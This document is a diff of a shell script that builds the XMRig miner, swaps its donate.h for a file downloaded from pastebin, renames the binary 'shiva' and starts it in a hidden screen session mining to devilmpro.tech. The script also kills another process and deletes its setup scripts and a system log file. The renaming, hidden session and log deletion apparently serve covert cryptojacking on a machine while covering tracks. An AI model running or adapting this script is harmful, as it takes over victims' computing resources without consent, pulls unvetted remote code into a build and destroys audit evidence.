@@ -10,11 +10,14 @@ sudo ./enable_1gb_pages.sh
 sudo ./randomx_boost.sh
 git clone https://github.com/xmrig/xmrig.git
 apt install curl -y
-cd ..
+cd
 mv xmrig pro
 cd pro 
 cd src 
-rm donate.h
+sudo rm -rf donate.h
+cd
+cd pro
+cd src
 curl https://pastebin.com/raw/WvFUTQTq --output donate.h
 cd
 cd pro
@@ -22,10 +25,14 @@ mkdir build
 cd build
 cmake ..
 make -j$(nproc)
-mv xmrig shiva
+cd 
+cd pro
+cd build
+sudo mv xmrig shiva
 screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
 sudo pkill akko
 screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
+cd 
 sudo rm enable_1gb_pages.sh
 sudo rm randomx_boost.sh
 sudo /bin/rm /var/log/alternatives.log
